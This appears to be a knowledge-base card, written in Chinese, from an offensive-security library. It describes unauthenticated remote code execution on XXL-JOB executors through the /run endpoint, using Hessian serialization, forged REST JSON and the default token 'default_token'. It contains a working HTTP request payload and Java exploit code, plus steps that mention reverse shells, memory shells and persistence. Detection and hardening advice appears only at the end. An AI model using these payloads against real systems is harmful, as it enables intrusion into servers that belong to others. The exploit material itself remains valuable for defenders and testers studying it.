---
id: web-java-component-xxl-job-executor-run-default-token-rce
title: XXL-JOB executor /run 2.2.0+ 伪造：REST JSON 与默认 accessToken default_token 利用，兼 <2.1.2 Hessian 协议
type: scenario
domain: web
path: web/java/component
technique: xxl-job-executor-default-token-run-rce
tags:
- java
- xxl-job
- executor
- rce
- access-token
- default-credentials
- hessian
- rest
- unauthenticated
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: 原文标注：XxlJob < 2.1.2（Hessian 触发）；2.2.0 <= XxlJob <= 2.4.0（REST 伪造）；XxlJob >= 2.4.0（默认 token default_token 未修改时可利用）
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:17:55+08:00'
  notes: 已对照原文及截图核对：affected_versions 三段均为原文明确标注——“XxlJob<2.1.2，需要利用Hessian触发”、“2.2.0<=XxlJob<=2.4.0 支持了RESTFUL API”、“XxlJob >= 2.4.0添加了默认token”，卡片逐字保留并注明 default_token 为 exp 中 XXL-JOB-ACCESS-TOKEN 头取值；Hessian PoC（XxlRpcRequest/ExecutorBiz#run/TriggerParam/GLUE_GROOVY/HessianSerializer async POST 9999）与原文 Java 代码一致；REST JSON PoC 字段与原文逐字一致；低版本指纹 xxl-rpc request data empty（图11）、高版本 invalid request, HttpMethod not support.（图12）均与截图一致。与既有 executor-unauth-run-glue-rce（<2.2.0 无 token JSON）为同接口不同版本/认证条件，按版本谱系独立成卡成立，不属于同链重复。未验证点：未对真实 executor 发包。
url: /docs/web/java/component/web-java-component-xxl-job-executor-run-default-token-rce/
draft: false
kb_aliases:
- XXL-JOB-ACCESS-TOKEN
- default_token
- xxl-job 2.4.0 默认 token
- xxl-job executor 未授权
- XxlRpcRequest Hessian RCE
- executor /run 伪造
---

## 一句话结论

XXL-JOB executor 的 `/run` 接口信任调度方：XxlJob < 2.1.2 可用 Hessian 序列化的 `XxlRpcRequest`（`ExecutorBiz#run` + `TriggerParam`，`glueType=GLUE_GROOVY`）直接触发命令执行；2.2.0–2.4.0 支持 RESTful API，直接 POST JSON 伪造调度请求；≥2.4.0 虽加入 `XXL-JOB-ACCESS-TOKEN` 校验，但默认值 `default_token` 与 nacos 默认 JWT、shiro 默认 key 一样常被忽略，未修改时仍可未授权执行 GLUE 脚本。

## 原理

- **通信模型**：XXL-JOB 由 admin（调度中心）与 executor（执行器，默认 9999）组成，二者通过 RPC 互调；admin 调 executor 的 `ExecutorBiz#run(TriggerParam)` 下发任务。executor 侧不校验调用来源，只依赖 accessToken（高版本）区分“是不是调度中心”。
- **< 2.1.2 阶段**：executor 9999 接受 xxl-rpc 的 HTTP+Hessian 请求。攻击者构造 `XxlRpcRequest`（`className=com.xxl.job.core.biz.ExecutorBiz`、`methodName=run`、参数为 `TriggerParam`），用 `HessianSerializer` 序列化后 POST 给 9999，executor 反序列化并反射调用 `run`，`TriggerParam` 中的 `glueSource` 即被执行的脚本。已有公开的 XxlJob-Hessian-RCE 工具复现该链。
- **2.2.0–2.4.0 阶段**：executor 支持 RESTful JSON 接口，`POST /run` 携带 `jobId`、`executorHandler`、`glueType`、`glueSource` 等字段即可；该阶段 token 校验尚未强制（或使用默认值），JSON 比 Hessian 更易构造。
- **≥ 2.4.0 阶段**：为修复未授权问题引入 `xxl.job.accessToken`（请求头 `XXL-JOB-ACCESS-TOKEN`），但执行器默认值为 `default_token`；部署者若不修改（镜像/脚本默认），攻击者带上 `XXL-JOB-ACCESS-TOKEN: default_token` 仍可调用 `/run`。这与 nacos 默认 JWT secret、shiro 默认 rememberMe key 属同一类“默认密钥”问题。
- **指纹**：低版本 executor（如 9999）直接访问返回 `XxlRpcResponse` + `xxl-rpc request data empty` 的 Netty 异常栈；高版本返回 `{"code":500,"msg":"invalid request, HttpMethod not support."}` JSON。据此可判断版本阶段并选择 PoC。
- **命令执行原语**：`glueType=GLUE_POWERSHELL`（Windows）或 `GLUE_SHELL`/`GLUE_GROOVY`（Linux/Java）配合 `glueSource` 脚本，executor 落盘并执行，与正常 GLUE 任务机制一致。

## 触发条件

- executor 的 9999 端口可从攻击者网络访问，且版本落在上述三个阶段之一。
- 版本 ≥2.4.0 时，目标未修改默认 `accessToken`（`default_token`）或 token 可猜测。
- executor 具备执行 GLUE 脚本的权限与依赖（Shell/PowerShell/Groovy 引擎按类型可用）。
- `/run` 未被网关/白名单拦截。

## 利用步骤

1. 指纹识别：访问 `http://target:9999/`，低版本返回 `xxl-rpc request data empty` 异常栈，高版本返回 `invalid request, HttpMethod not support.`。
2. 按版本选择载荷：
   - <2.1.2：Hessian 序列化 `XxlRpcRequest` 后 POST 到 9999（可用 XxlJob-Hessian-RCE 工具）。
   - 2.2.0–2.4.0：直接 POST `/run` JSON。
   - ≥2.4.0：POST `/run` JSON，并加请求头 `XXL-JOB-ACCESS-TOKEN: default_token`（若已改 token 则失败）。
3. `glueType` 选 `GLUE_POWERSHELL`/`GLUE_SHELL`/`GLUE_GROOVY`，`glueSource` 写验证命令（如 `calc`、`id`）或反弹 shell。
4. 观察响应 `{"code":200}` 与执行效果；成功后按需注入 Jetty Handler 内存马或持久化。

## PoC

REST 伪造（2.2.0–2.4.0；≥2.4.0 依赖默认 token）：

```http
POST /run HTTP/1.1
Host: target:10999
XXL-JOB-ACCESS-TOKEN: default_token
Content-Type: application/json
Connection: close

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "calc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

Hessian 触发（< 2.1.2，精简自原文 Java 代码）：

```java
TriggerParam params = new TriggerParam();
params.setJobId(10);
params.setLogId(10);
params.setLogDateTime(System.currentTimeMillis());
params.setGlueType("GLUE_GROOVY");
params.setGlueSource("package com.xxl.job.service.handler;\n" +
    "import com.xxl.job.core.handler.IJobHandler;\n" +
    "import com.xxl.job.core.biz.model.ReturnT;\n" +
    "public class DemoGlueJobHandler extends IJobHandler {\n" +
    "  public ReturnT<String> execute(String param) throws Exception {\n" +
    "    Runtime.getRuntime().exec(\"calc\");\n" +
    "    return ReturnT.SUCCESS;\n" +
    "  }\n" +
    "}\n");
params.setGlueUpdatetime(System.currentTimeMillis());

XxlRpcRequest req = new XxlRpcRequest();
req.setRequestId("111");
req.setClassName("com.xxl.job.core.biz.ExecutorBiz");
req.setMethodName("run");
req.setParameterTypes(new Class[]{TriggerParam.class});
req.setParameters(new Object[]{params});
req.setCreateMillisTime(System.currentTimeMillis());

byte[] data = new HessianSerializer().serialize(req);
// AsyncHttpClient POST data 到 http://target:9999
```

原文截图中还展示了 `jobId=7` 的 `GLUE_POWERSHELL` 载荷 `calc` 与响应验证；本卡未复跑 PoC。

## 变体与关联

- **同接口不同版本**：[[web-java-component-xxl-job-executor-unauth-run-glue-rce]] 覆盖 <2.2.0 无 token 的 `/run` 直接利用（JSON + GLUE_SHELL，含 gluesource 落盘取证）；本卡补充 2.2.0+ 的 REST/token 与 <2.1.2 Hessian 协议，两者版本条件与 PoC 不同。
- **默认密钥族**：`default_token` 与 nacos 默认 JWT、shiro 默认 key 类似，属于“修复引入了默认凭据但用户不改”的问题。
- **SQL 置任务变体**：不直连 executor，改为向数据库插入任务由 admin 调度下发，见 [[web-java-component-xxl-job-db-insert-cron-job-rce]]。
- **执行后**：Jetty Handler 内存马 [[web-java-component-xxl-job-executor-jetty-handler-collection-memshell]]。

## 检测与防御

- **升级/配置**：升级并按官方要求设置强随机 `xxl.job.accessToken`，确保 admin/executor 一致且不使用 `default_token`；9999 只允许调度中心访问。
- **网络层**：对 executor 9999 端口的非调度中心来源请求告警；禁止该端口暴露公网。
- **请求检测**：`/run` 请求携带 `XXL-JOB-ACCESS-TOKEN: default_token`、`glueType=GLUE_*` 且 `glueSource` 含命令执行/反弹特征；Hessian 请求（`Content-Type` 非 JSON、`xxl-rpc` 特征字节流）到 9999。
- **主机层**：executor 落盘目录 `gluesource` 出现新脚本、进程派生子 shell、异常网络回连。
- **默认凭据治理**：将 `default_token` 纳入默认口令扫描清单，与 nacos/shiro 默认 key 一起检查。
